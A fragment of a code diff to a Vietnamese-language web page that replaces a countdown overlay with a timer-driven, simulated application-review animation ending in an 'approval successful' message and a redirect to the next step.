+            message: 'Đang phân tích hạn mức khả dụng',
+            duration: 2000, // 2 giây
+            icon: 'fa-solid fa-chart-line'
+          },
+          {
+            message: 'Hồ sơ hợp lệ!',
+            duration: 1500, // 1.5 giây trước khi chuyển trang
+            icon: 'fa-solid fa-check',
+            isComplete: true
+          }
+        ];
+
+        var currentStage = 0;
+
+        // ============================================
+        // UPDATE UI FUNCTION
+        // Cập nhật giao diện theo từng giai đoạn
+        // ============================================
+        function updateUI(stageIndex) {
+          var stage = stages[stageIndex];
+          
+          // Update icon with transition
+          centerIcon.className = stage.icon;
+
+          // Update status message with fade effect
+          statusMessage.classList.add('fade-out');
+          
+          setTimeout(function() {
+            statusText.textContent = stage.message;
+            
+            // Handle completion state
+            if (stage.isComplete) {
+              // Hide typing dots, show success
+              typingDots.style.display = 'none';
+              statusMessage.classList.add('is-success');
+              
+              // Use safe DOM manipulation instead of innerHTML to prevent XSS
+              statusMessage.textContent = ''; // Clear existing content
+              var checkIcon = document.createElement('i');
+              checkIcon.className = 'fa-solid fa-circle-check';
+              checkIcon.setAttribute('aria-hidden', 'true');
+              var messageSpan = document.createElement('span');
+              messageSpan.textContent = stage.message;
+              statusMessage.appendChild(checkIcon);
+              statusMessage.appendChild(messageSpan);
+              
+              // Update title
+              statusTitle.textContent = 'Xét duyệt thành công!';
+              
+              // Add complete class to radar
+              radarContainer.classList.add('is-complete');
+            }
+            
+            statusMessage.classList.remove('fade-out');
+          }, 200);
+
+          // Update progress steps
+          steps.forEach(function(step, index) {
+            step.classList.remove('is-active', 'is-complete');
+            
+            if (index < stageIndex) {
+              step.classList.add('is-complete');
+            } else if (index === stageIndex) {
+              step.classList.add('is-active');
             }
           });
-        }
 
-        if (btnContinue) {
-          btnContinue.addEventListener("click", function () {
-            if (typeof goToNextStep === "function") {
-              goToNextStep("continue");
-            } else {
-              window.location.href = "step5.html";
-            }
-          });
-        }
-
-        // ===========================
-        // LOADING OVERLAY CONTROLLER
-        // ===========================
-        var TOTAL_TIME = 30; // seconds
-        var overlay = document.getElementById("approvalLoadingOverlay");
-        var successContent = document.getElementById("successContent");
-        var progressCircle = document.getElementById("loadingProgressCircle");
-        var percentText = document.getElementById("loadingPercentText");
-        var countdownText = document.getElementById("loadingCountdown");
-
-        if (!overlay || !progressCircle || !percentText || !countdownText) {
-          return;
-        }
-
-        var radius = 70;
-        var circumference = 2 * Math.PI * radius;
-        progressCircle.style.strokeDasharray = circumference;
-        progressCircle.style.strokeDashoffset = circumference;
-
-        var elapsed = 0;
-        var interval = setInterval(function () {
-          elapsed += 1;
-          if (elapsed > TOTAL_TIME) {
-            elapsed = TOTAL_TIME;
+          // Update progress bar aria value
+          var progressBar = document.querySelector('.progress-steps');
+          if (progressBar) {
+            progressBar.setAttribute('aria-valuenow', stageIndex + 1);
           }
 
-          var progress = elapsed / TOTAL_TIME; // 0 -> 1
-          var offset = circumference * (1 - progress);
-          progressCircle.style.strokeDashoffset = offset;
+          // Announce to screen readers
+          srAnnouncement.textContent = stage.message;
+        }
 
-          var percent = Math.round(progress * 100);
-          percentText.textContent = percent + "%";
-
-          var remaining = TOTAL_TIME - elapsed;
-          countdownText.innerHTML =
-            'Thời gian còn lại: <strong>' +
-            remaining +
-            " giây</strong>";
-
-          if (elapsed >= TOTAL_TIME) {
-            clearInterval(interval);
-            // Hide loading and show success layout immediately
-            overlay.classList.add("is-hidden");
-            successContent.removeAttribute("aria-hidden");
+        // ============================================
+        // RUN SIMULATION
+        // Chạy quy trình mô phỏng xét duyệt
+        // ============================================
+        function runSimulation() {
+          // Store duration before any changes to currentStage
+          var currentDuration = stages[currentStage].duration;
+          
+          // Initial stage already shown, proceed to next stages
+          if (currentStage < stages.length - 1) {
+            setTimeout(function() {
+              currentStage++;
+              updateUI(currentStage);
+              runSimulation();
+            }, currentDuration);
+          } else {
+            // All stages complete - redirect to step6.html
+            setTimeout(function() {
+              // Chuyển hướng sang step6.html sau khi hoàn tất
+              window.location.href = 'step6.html';
+            }, currentDuration);
           }
-        }, 1000);
+        }
 
-        // Ensure success content is hidden from SRs until finished
-        successContent.setAttribute("aria-hidden", "true");
+        // ============================================
+        // INITIALIZE
+        // Khởi tạo và bắt đầu simulation
+        // ============================================
+        function init() {
+          // Show initial stage
+          updateUI(0);
+          
+          // Start the simulation process
+          runSimulation();
+        }
+
+        // Start when DOM is ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', init);
+        } else {
+          init();
+        }
+
       })();
     </script>
   </body>
